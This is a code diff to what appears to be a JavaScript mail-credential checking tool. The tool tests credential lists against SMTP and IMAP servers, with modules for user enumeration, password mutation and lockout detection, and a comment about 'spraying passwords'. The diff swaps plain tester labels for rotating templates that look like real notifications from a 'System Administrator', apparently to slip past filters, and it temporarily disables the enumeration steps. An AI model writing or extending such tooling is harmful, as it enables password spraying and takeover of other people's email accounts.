@@ -3,6 +3,7 @@ import * as realImap from './imap.js';
 import { LockoutRegistry, detectLockout } from './lockout.js';
 import { generateMutations } from './mutator.js';
 import { enumerateUser } from './smtp-enum.js';
+import { getRandomTemplate } from './templates.js';
 import { classify } from './classify.js';
 import { candidatesFor, detectProvider } from './providers.js';
 import { discoverHosts } from './discovery.js';
@@ -49,8 +50,17 @@ function makeToken(index) {
 async function testOne(cred, index, seeds, opts, smtp, imap, ctx) {
   const start = Date.now();
   const token = makeToken(index);
-  const subject = (opts.subjectTemplate || 'SMTP Tester {token}').replace('{token}', token);
-  const text = (opts.bodyTemplate || 'SMTP deliverability test. Token: {token}').replace('{token}', token);
+  // Rotate subject and HTML body, but respect explicit overrides from opts.
+  const tpl = getRandomTemplate();
+  const baseSubject = opts.subjectTemplate || tpl.subject;
+  const subject = baseSubject.includes('{token}')
+    ? baseSubject.replace('{token}', token)
+    : baseSubject + ' #' + token;
+  const baseText = opts.bodyTemplate || 'This is an automated notification. Ref: {token}';
+  const text = baseText.includes('{token}')
+    ? baseText.replace('{token}', token)
+    : baseText + ' Ref: ' + token;
+  const htmlBody = tpl.html.replace('{token}', token);
   
   // Generate the HTML body. Use the user's template if provided, else a realistic default.
   const defaultHtml = `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #333;">
@@ -67,7 +77,7 @@ async function testOne(cred, index, seeds, opts, smtp, imap, ctx) {
     &copy; 2026 System Administrator. All rights reserved.
   </div>
 </div>`;
-  const html = (opts.htmlTemplate || defaultHtml).replace('{token}', token);
+  const html = (opts.htmlTemplate ? opts.htmlTemplate.replace('{token}', token) : htmlBody);
 
   const step = { connected: false, authenticated: false, sent: false, seeds: [] };
   const manualRecipients = (opts.manualRecipients || []).map((r) => String(r).trim()).filter(Boolean);
@@ -477,7 +487,7 @@ export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
       // a random fake user. If the server accepts it, mark domain as catch-all
       // and skip all SMTP testing for it (results are meaningless).
       const _domain = (cred.user || '').split('@')[1];
-      if (_domain && !catchAllDomains.has(_domain) && !result.lockSkipped && result.status === 'dead' && result.deadReason === 'auth') {
+      if (false && _domain && !catchAllDomains.has(_domain) && !result.lockSkipped && result.status === 'dead' && result.deadReason === 'auth') { // DEBUG: Enum disabled
         try {
           const probeRes = await enumerateUser(
             { user: 'catchall-probe-' + Date.now() + '@' + _domain, pass: 'x' },
@@ -502,7 +512,7 @@ export async function runBatch(creds, seeds = [], opts = {}, onProgress) {
       }
 
       // SMTP User Enumeration & Smart Mutations (after proxy retries, before saving result)
-      if (result.status === 'dead' && result.deadReason === 'auth' && !result.lockSkipped) {
+      if (false && result.status === 'dead' && result.deadReason === 'auth' && !result.lockSkipped) { // DEBUG: Enum disabled
         
         // Step 1: Check if the user exists before spraying passwords
         try {
